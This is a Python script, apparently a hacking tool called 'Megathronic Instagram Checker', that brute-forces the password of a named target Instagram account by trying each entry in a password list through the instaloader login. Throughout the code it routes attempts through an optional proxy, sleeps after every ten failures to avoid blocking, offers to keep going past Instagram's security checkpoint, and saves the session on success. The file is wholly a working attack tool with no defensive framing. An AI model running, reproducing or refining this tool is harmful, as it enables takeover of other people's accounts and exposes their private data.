import instaloader
from instaloader.exceptions import BadCredentialsException, ConnectionException, TwoFactorAuthRequiredException
import argparse
import os
import platform
import sys
import time

# İşletim sistemine göre terminal temizleme
def clear_screen():
    os.system("cls" if platform.system() == "Windows" else "clear")

clear_screen()

# ANSI Renk Kodları
COLORS = {
    "GREEN": '\033[92m',        # Yeşil
    "RED": '\033[91m',          # Kırmızı
    "CYAN": '\033[96m',         # Camgöbeği
    "PURPLE": '\033[95m',       # Mor
    "LIGHT_BLUE": '\033[38;2;173;216;230m',  # Açık Mavi
    "YELLOW": '\033[93m',       # Sarı
    "RESET": '\033[0m'          # Sıfırlama (varsayılan renk)
}

# ASCII Sanatı
def print_ascii_art():
    ascii_art = f"""
{COLORS['LIGHT_BLUE']}
              .O           N.
            . .N.           .N. .
          ... Z..           ..Z ...
          ....N               N...,
        .N. N.               .N .N.
        7D.~N... .. . . ......N~.+7
       .D8.,.  .,.$DDNDND.,. ..,.,N.
        .NN~....ZDDDNNNNNNNDNZ....~DN.
           .DN,..DIONNNZID..,NN.
       ..:N....ND..NNNNN..DN....D7..
      NN..    ~N  .NNNNN.  N:    ..NN
      DN      IN   .NNN.  .NI      NN
      ,N      ~N.  ..N..  .N~      N~
      .N      .N.         .N.      N.
       D:.    .N.         .N.     :D
       .N.    .8.         .N.    .N.
         8.    .D.       .D.    .:
         .     ..=       =..
                 ..     ..


{COLORS['GREEN']} Megathronic Instagram Checker ••• Developer By Cyze 🌹{COLORS['CYAN']}
    """
    print(ascii_art)

# Kullanıcı adı ve parola kontrolü
def check_credentials(username, password, proxy=None):
    L = instaloader.Instaloader()

    # Proxy ayarı
    if proxy:
        L.context.proxy = proxy

    try:
        L.login(username, password)
        L.save_session_to_file()
        return True, None
    except BadCredentialsException:
        return False, None
    except TwoFactorAuthRequiredException:
        return False, "two_factor_auth"
    except ConnectionException as e:
        if "Checkpoint required" in str(e):
            return None, "checkpoint"
        return False, str(e)

# Hata mesajı gösterme
def custom_error_message(message):
    print(f"{COLORS['RED']}[Error]: {message}{COLORS['RESET']}")
    sys.exit(1)

# Parola listesini oku
def read_passwords(filename):
    try:
        with open(filename, 'r', encoding='utf-8') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        custom_error_message(f"{COLORS['RED']} File not found: {filename}. Please provide the correct file path.{COLORS['RESET']}")

# Özelleştirilmiş hata mesajları için argümanlar
class CustomArgumentParser(argparse.ArgumentParser):
    def error(self, message):
        sys.stderr.write(f"{COLORS['RED']} error: {message}{COLORS['RESET']}\n")
        print("")  # Boş satır ekle
        self.print_help_with_space()  # Yardım mesajını boşlukla göster
        sys.exit(2)  # Programı sonlandır

    def print_help_with_space(self):
        # Yardım mesajını yazdırmadan önce bir boşluk karakteri ekle
        sys.stdout.write(" ")  # Tek bir boşluk bırak
        self.print_help()  # Yardım mesajını yazdır

    def format_usage(self):
        # `usage:` kısmına bir boşluk ekle
        usage = super().format_usage()
        return " " + usage.strip()  # Usage kısmına başta bir boşluk ekle

    def format_help(self):
        # `options:` kısmına da bir boşluk ekle
        help_text = super().format_help()
        help_text = help_text.replace("options:", " options:")
        return help_text

# Ana fonksiyon
def main():
    print_ascii_art()

    parser = CustomArgumentParser(description=f"{COLORS['CYAN']} 🌹{COLORS['RESET']}", add_help=True)
    parser.add_argument("-u", "--username", type=str, required=True, help=f"{COLORS['GREEN']}Target Instagram username.{COLORS['RESET']}")
    parser.add_argument("-p", "--password-file", type=str, required=True, help=f"{COLORS['GREEN']}Path to the password list file.{COLORS['RESET']}")
    parser.add_argument("--proxy", type=str, required=False, help=f"{COLORS['GREEN']}Use a proxy (e.g., socks5).{COLORS['RESET']}")

    args = parser.parse_args()
    username, password_file, proxy = args.username, args.password_file, args.proxy

    if not username or not password_file:
        custom_error_message(f"{COLORS['RED']} Missing required arguments: -u/--username and -p/--password-file are required.{COLORS['RESET']}")

    passwords = read_passwords(password_file)
    checkpoint_warning = False
    incorrect_attempts = 0

    for password in passwords:
        result, error = check_credentials(username, password, proxy)

        if result:
            print(f"{COLORS['GREEN']}• Password Found:{COLORS['RESET']} {password}\n")
            return
        elif error == "checkpoint":
            if not checkpoint_warning:
                print(f"{COLORS['RED']} Checkpoint required. Verify your account on Instagram.{COLORS['RESET']}")
                choice = input(f"{COLORS['RED']} Continue despite checkpoint? (y/n): {COLORS['RESET']}").lower()
                if choice != 'y':
                    print(f"{COLORS['LIGHT_BLUE']} Program stopped by user.{COLORS['RESET']}")
                    return
                checkpoint_warning = True
        elif error == "two_factor_auth":
            print(f"{COLORS['LIGHT_BLUE']} Two-factor authentication enabled: {password}{COLORS['RESET']}\n")
            return
        else:
            print(f"{COLORS['RED']}• Incorrect Password:{COLORS['RESET']} '{password}'\n")
            incorrect_attempts += 1

        # Çok fazla yanlış girişte bekleme süresi koyarak engellenmeyi önleme
        if incorrect_attempts % 10 == 0:
            print(f"{COLORS['PURPLE']}Too many incorrect attempts. Waiting 30 seconds...{COLORS['RESET']}")
            time.sleep(30)

    print(f"{COLORS['PURPLE']}Total:{COLORS['RESET']} {COLORS['CYAN']}All passwords are incorrect.{COLORS['RESET']}\n")

# Çalıştırma
if __name__ == "__main__":
    main()
